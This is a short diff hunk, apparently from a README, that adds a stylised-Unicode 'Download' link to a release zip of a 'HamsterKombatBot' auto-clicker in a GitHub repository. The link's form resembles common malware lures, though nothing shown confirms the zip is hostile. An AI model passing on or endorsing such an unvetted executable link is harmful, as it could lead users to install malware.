@@ -2,7 +2,7 @@
 
 ## UPDATE 17.07.2024 
 
-## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/shrivignesh37/HamsterKombatBot-autobot/releases/download/HamsterKombatBot/HamsterKombatBot.zip)***
 
 ---
 
